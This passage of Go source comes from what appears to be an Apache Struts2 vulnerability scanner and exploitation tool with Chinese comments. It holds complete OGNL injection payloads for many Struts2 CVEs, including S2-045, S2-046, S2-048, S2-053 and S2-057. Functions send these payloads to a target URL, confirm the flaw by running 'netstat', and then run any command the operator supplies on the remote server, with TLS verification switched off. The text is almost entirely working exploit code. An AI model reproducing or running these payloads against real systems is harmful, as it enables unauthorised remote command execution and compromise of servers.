		"struts2-053" : "%25%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27echo%20%2281dc9bdb52d04dc2%22%26%26FUZZINGCOMMAND%26%26echo%20%220036dbd8313ed055%22%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23process.getInputStream%28%29%29%29%7D",
		"struts2-057-1" : "/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27FUZZINGCOMMAND%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D",
		"struts2-057-2" : "/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27FUZZINGCOMMAND%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D",
	}
)

func addHistory(word string)  {
	//检测到漏洞时将漏洞信息写入history.txt
	file, err := os.OpenFile(
		"history.txt",
		os.O_WRONLY|os.O_APPEND|os.O_CREATE,
		0666,
	)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]无法写入history.txt", err)
	}
	defer file.Close()
	// 写字节到文件中
	byteSlice := []byte(word)
	_ , err = file.Write(byteSlice)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]无法写入history.txt", err)
	}
}

func vulnerabilityChecking(url, req, poc string)  {
	//验证是否存在漏洞
	switch {
	case strings.Contains(req,"Active Internet connections") == true:
		fmt.Printf("\033[1;31m%s\033[0m\n","[+]Linux目标存在"+poc+"漏洞")
		addHistory(url+" find "+poc+" successfully\n")

	case strings.Contains(req,"Active Connections") == true || strings.Contains(req,"活动连接") == true:
		fmt.Printf("\033[1;31m%s\033[0m\n","[+]Windows目标存在"+poc+"漏洞")
		addHistory(url+" find "+poc+" successfully\n")

	case strings.Contains(req,"LISTEN") == true:
		fmt.Printf("\033[1;31m%s\033[0m\n","[+]目标存在"+poc+"漏洞")
		addHistory(url+" find "+poc+" successfully\n")

	default:
		fmt.Printf("\033[1;32m%s\033[0m\n","[-]目标不存在"+poc+"漏洞")

	}
}

func getVulnerabilityScanner(poc, url string, header map[string]string) (string,error) {
	//跳过证书验证
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}

	req, err := http.NewRequest("GET", url+poc,nil)
	if err != nil {
		return "", err
	}

	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return "",err
	}

	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body),nil
}

func postVulnerabilityScanner(poc, url string, header map[string]string) (string,error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}

	req, err := http.NewRequest("POST", url,strings.NewReader(poc))
	if err != nil {
		return "", err
	}

	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return "",err
	}

	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body),nil
}

func getVulnerabilityScanner0452(url string) error {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return err
	}
	req.Header.Add("Content-Type", "${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"testvuln\",1234*1234)}.multipart/form-data")
	reqs, errs := client.Do(req)
	if errs != nil {
		return errs
	}
	if strings.Contains(reqs.Header.Get("testvuln"),"1522756") == true {
		fmt.Printf("\033[1;31m%s\033[0m\n","[+]目标存在struts2-045-2漏洞")
		addHistory(url+" find struts2-045-2 successfully\n")
	}else {
		fmt.Printf("\033[1;32m%s\033[0m\n","[-]目标不存在struts2-045-2漏洞")
	}
	return nil
}

func postVulnerabilityScanner046(url string, header map[string]string) (string,error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	file := "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -an').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\\x000"
	bodyBuf := &bytes.Buffer{}
	bodyWriter := multipart.NewWriter(bodyBuf)
	filename := "test"
	fileWriter, err := bodyWriter.CreateFormFile("uploadfile", filename)
	if err != nil {
		return "", err
	}
	_, err = io.Copy(fileWriter, strings.NewReader(file))
	if err != nil {
		return "", err
	}
	contentType := bodyWriter.FormDataContentType()
	bodyWriter.Close()


	req, err := http.NewRequest("POST", url, bodyBuf)
	if err != nil {
		return "", err
	}

	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Content-Type", contentType)

	reqs, errs := client.Do(req)
	if errs != nil {
		return "", errs
	}
	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil
}

func postVulnerabilityScanner048(s string, header map[string]string) (string,error) {
	data := make(url.Values)
	data.Add("name", poc["ST2_048"])
	data.Add("age", "1")
	data.Add("__checkbox_bustedBefore", "true")
	data.Add("description", "1")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	urll, _ := url.Parse(s)
	target := urll.Scheme + "://" + urll.Host + "/struts2-showcase/integration/saveGangster.action"
	req, err := http.NewRequest("POST", target, strings.NewReader(data.Encode()))
	if err != nil {
		return "", err
	}

	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil
}

func postVulnerabilityScanner020(url string, header map[string]string) error {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}

	req1, err := http.NewRequest("GET", url+"?class[%27classLoader%27][%27jarPath%27]=1", nil)
	if err != nil {
		return err
	}
	req1.Header.Add("User-Agent", header["User-Agent"])
	req1.Header.Add("Accept", header["Accept"])
	req1.Header.Add("Content-Type", header["Content-Type"])
	reqs1, err := client.Do(req1)
	if err != nil {
		return err
	}

	req2, err :=http.NewRequest("GET", url+"?class[%27classLoader%27][%27resources%27]=1", nil)
	if err != nil {
		return err
	}
	req2.Header.Add("User-Agent", header["User-Agent"])
	req2.Header.Add("Accept", header["Accept"])
	req2.Header.Add("Content-Type", header["Content-Type"])
	reqs2, err := client.Do(req2)
	if err != nil {
		return err
	}

	if reqs1.StatusCode == 200 && reqs2.StatusCode == 404 {
		fmt.Printf("\033[1;31m%s\033[0m\n","[+]Windows目标存在struts2-020漏洞（暂无POC）")
		addHistory(url+" find struts2-020 successfully\n")
	}else {
		fmt.Printf("\033[1;32m%s\033[0m\n","[-]目标不存在struts2-020漏洞：")
	}
	return nil
}

func getVulnerabilityScanner017(url string, header map[string]string) error {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	req, err := http.NewRequest("GET", url+"?redirect:https://www.baidu.com/%23", nil)
	if err != nil {
		return err
	}
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return err
	}
	if reqs.StatusCode == 302 {
		fmt.Printf("\033[1;31m%s\033[0m\n","[+]struts2-017检测成功（暂无可用POC）：")
		addHistory(url+" find struts2-017 successfully\n")
	}else {
		fmt.Printf("\033[1;32m%s\033[0m\n","[-]目标不存在struts2-017漏洞")
	}
	return nil
}

func postVulnerabilityScanner052(url string, header map[string]string) error {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	req, err := http.NewRequest("POST", url, strings.NewReader(poc["ST2_052"]))
	if err != nil {
		return err
	}
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return err
	}
	body, _ := ioutil.ReadAll(reqs.Body)
	defer reqs.Body.Close()
	if reqs.StatusCode == 500 &&  strings.Contains(string(body), "java.security.Provider$Service") == true{
		fmt.Printf("\033[1;31m%s\033[0m\n","[+]struts2-052检测成功（暂无可用POC，可参考MSF的struts2_rest_xstream模块）：")
		addHistory(url+" find struts2-052 successfully\n")
	} else {
		fmt.Printf("\033[1;32m%s\033[0m\n","[-]目标不存在struts2-052漏洞")
	}
	return nil
}

func getVulnerabilityScanner053(url string, header map[string]string) error {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	var params = []string{
		"id",
		"name",
		"filename",
		"username",
		"password",
	}
	for i := range params{
		req, err := http.NewRequest("GET", url+"?"+params[i]+"="+poc["ST2_053"], nil)
		if err != nil {
			return err
		}
		req.Header.Add("User-Agent", header["User-Agent"])
		req.Header.Add("Accept", header["Accept"])
		req.Header.Add("Content-Type", header["Content-Type"])
		reqs, errs := client.Do(req)
		if errs != nil {
			return errs
		}
		body, _ := ioutil.ReadAll(reqs.Body)
		defer reqs.Body.Close()
		vulnerabilityChecking(url, string(body), "struts2-053"+"参数（"+params[i]+"）")
	}
	return nil
}

func getVulnerabilityScanner057(urll string, header map[string]string) error {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	surl,_ := url.Parse(urll)
	rul1 := strings.Replace(urll, surl.Path, "", -1) + poc["struts2_057_1"] + surl.Path
	req1, err1 := http.NewRequest("GET", rul1, nil)
	if err1 != nil {
		return err1
	}
	req1.Header.Add("User-Agent", header["User-Agent"])
	req1.Header.Add("Accept", header["Accept"])
	reqs1, err1 := client.Do(req1)
	if err1 != nil {
		return err1
	}
	body, _ := ioutil.ReadAll(reqs1.Body)
	defer reqs1.Body.Close()
	vulnerabilityChecking(urll, string(body), "struts2-057-1")

	rul2 := strings.Replace(urll, surl.Path, "", -1) + poc["struts2_057_2"] + surl.Path
	req2, err2 := http.NewRequest("GET", rul2, nil)
	if err2 != nil {
		return err2
	}
	req2.Header.Add("User-Agent", header["User-Agent"])
	req2.Header.Add("Accept", header["Accept"])
	reqs2, err2 := client.Do(req2)
	if err2 != nil {
		return err2
	}
	body, _ = ioutil.ReadAll(reqs2.Body)
	defer reqs2.Body.Close()
	vulnerabilityChecking(urll, string(body), "检测struts2-057-2")
	return nil
}

func vulnerabilityScanner(url string)  {
	req, err := postVulnerabilityScanner(poc["ST2_005"], url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-005检测失败：", err)
	}
	vulnerabilityChecking(url, req,"struts2-005")

	req, err = getVulnerabilityScanner(poc["ST2_008_1"], url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-008-1检测失败：", err)
	}
	vulnerabilityChecking(url, req,"struts2-008-1")

	req, err = getVulnerabilityScanner(poc["ST2_008_2"], url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-008-2检测失败：", err)
	}
	vulnerabilityChecking(url, req,"struts2-008-2")

	req, err = postVulnerabilityScanner(poc["ST2_009"], url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-009检测失败：", err)
	}
	vulnerabilityChecking(url, req,"struts2-009")

	req, err = postVulnerabilityScanner(poc["ST2_013"], url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-013检测失败：", err)
	}
	vulnerabilityChecking(url, req,"struts2-013")

	req, err = postVulnerabilityScanner(poc["ST2_016"], url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-016检测失败：", err)
	}
	vulnerabilityChecking(url, req,"struts2-016")

	err = getVulnerabilityScanner017(url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-017检测失败", err)
	}

	req, err = postVulnerabilityScanner(poc["ST2_019"], url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-019检测失败：", err)
	}
	vulnerabilityChecking(url, req,"struts2-019")

	req, err = getVulnerabilityScanner(poc["ST2_devmode"], url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-devmode检测失败：", err)
	}
	vulnerabilityChecking(url, req,"struts2-devmode")

	req, err = getVulnerabilityScanner(poc["ST2_032"], url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-032检测失败：", err)
	}
	vulnerabilityChecking(url, req,"struts2-032")

	req, err = getVulnerabilityScanner(poc["ST2_033"], url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-033检测失败：", err)
	}
	vulnerabilityChecking(url, req,"struts2-033")

	req, err = getVulnerabilityScanner(poc["ST2_037"], url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-037检测失败：", err)
	}
	vulnerabilityChecking(url, req,"struts2-037")

	req, err = getVulnerabilityScanner("", url, header2)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-045检测失败：", err)
	}
	vulnerabilityChecking(url, req,"struts2-045")

	err = getVulnerabilityScanner0452(url)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-045-2检测失败：", err)
	}

	req, err = postVulnerabilityScanner046(url,header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-046检测失败：", err)
	}
	vulnerabilityChecking(url, req,"struts2-046")

	req, err = postVulnerabilityScanner048(url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-048检测失败：", err)
	}
	vulnerabilityChecking(url, req, "struts2-048")

	err = postVulnerabilityScanner020(url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-020检测失败：", err)
	}

	err = postVulnerabilityScanner052(url, header3)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-052检测失败：", err)
	}

	err = getVulnerabilityScanner053(url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]struts2-053检测失败：", err)
	}

	err = getVulnerabilityScanner057(url, header1)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]检测struts2-057-2检测失败：", err)
	}
}

func getShellCommandExecution(url, poc,cmd string, header map[string]string) (string,error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	command := strings.Replace(poc, "FUZZINGCOMMAND", cmd, -1)
	curl := url + command
	req, err := http.NewRequest("GET", curl, nil)
	if err != nil {
		return "", err
	}
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return "", err
	}

	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil
}

func postShellCommandExecution(url, poc, cmd string, header map[string]string) (string,error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	data := strings.Replace(poc, "FUZZINGCOMMAND", cmd, -1)
	req, err := http.NewRequest("POST", url, strings.NewReader(data))
	if err != nil {
		return "", err
	}
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])
	
	reqs, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil
}

func getShellCommandExecution045(url, cmd string) (string,error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}
	req.Header.Add("User-Agent" ,"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36")
	req.Header.Add("Accept", "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*")
	req.Header.Add("Content-Type", "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}")
	
	reqs, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil
}

func getShellCommandExecution0452(url, cmd string) (string,error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}
	req.Header.Add("User-Agent" ,"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36")
	req.Header.Add("Accept", "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*")
	req.Header.Add("Content-Type", "%{(#dm='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}")
	
	reqs, err := client.Do(req)
	if err != nil {
		return "",err
	}
	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil
}

func postShellCommandExecution046(url, cmd string, header map[string]string) (string,error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	file := "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\\x000"
	bodyBuf := &bytes.Buffer{}
	bodyWriter := multipart.NewWriter(bodyBuf)
	filename := "test"
	fileWriter, err := bodyWriter.CreateFormFile("uploadfile", filename)
	if err != nil {
		return "", err
	}
	_, err = io.Copy(fileWriter, strings.NewReader(file))
	if err != nil {
		return "", err
	}
	contentType := bodyWriter.FormDataContentType()
	bodyWriter.Close()

	req, err := http.NewRequest("POST", url, bodyBuf)
	if err != nil {
		return "", err
	}

	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Content-Type", contentType)

	reqs, errs := client.Do(req)
	if errs != nil {
		return "", errs
	}
	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil
}

func postShellCommandExecution048(s,cmd string, header map[string]string) (string,error) {
	command := strings.Replace(shell["struts2-048"], "FUZZINGCOMMAND", cmd, -1)
	data := make(url.Values)
	data.Add("name", command)
	data.Add("age", "1")
	data.Add("__checkbox_bustedBefore", "true")
	data.Add("description", "1")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	urll, _ := url.Parse(s)
	target := urll.Scheme + "://" + urll.Host + "/struts2-showcase/integration/saveGangster.action"

	req, err := http.NewRequest("POST", target, strings.NewReader(data.Encode()))
	if err != nil {
		return "", err
	}
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil
}

func getShellCommandExecution053(url, cmd string, header map[string]string) (string,error) {
	fmt.Println("请为struts2-053指定参数：")
	reader := bufio.NewReader(os.Stdin)
	param, err := reader.ReadString('\n')
	if err != nil {
		return "", err
	}

	command := strings.Replace(shell["struts2-053"], "FUZZINGCOMMAND", cmd, -1)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}

	req, err := http.NewRequest("GET", url+"?"+param+"="+command, nil)
	if err != nil {
		return "", err
	}
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil

}

func getShellCommandExecution057(urll, cmd, poc string, header map[string]string) (string,error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	commad := strings.Replace(shell[poc], "FUZZINGCOMMAND", cmd, -1)
	surl,_ := url.Parse(urll)
	rul := strings.Replace(urll, surl.Path, "", -1) + commad + surl.Path

	req, err := http.NewRequest("GET", rul, nil)
	if err != nil {
		return "", err
	}
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return "", err
	}
	body, _ := ioutil.ReadAll(reqs.Body)
	defer reqs.Body.Close()
	return string(body), nil
}

func commandExecution(url, poc, cmd string)  {
	switch {
	case poc == "struts2-005":
		req, err := postShellCommandExecution(url, shell["struts2-005"], cmd, header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-008-1":
		req, err := getShellCommandExecution(url, shell["struts2-008-1"], cmd, header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-008-2":
		req, err := getShellCommandExecution(url, shell["struts2-008-2"], cmd, header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-009":
		req, err := postShellCommandExecution(url, shell["struts2-009"], cmd, header1)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]"+cmd+"命令执行失败",err)
			return
		}
		fmt.Println(req)

	case poc == "struts2-013":
		req, err := postShellCommandExecution(url, shell["struts2-013"], cmd, header1)
		if err != nil {
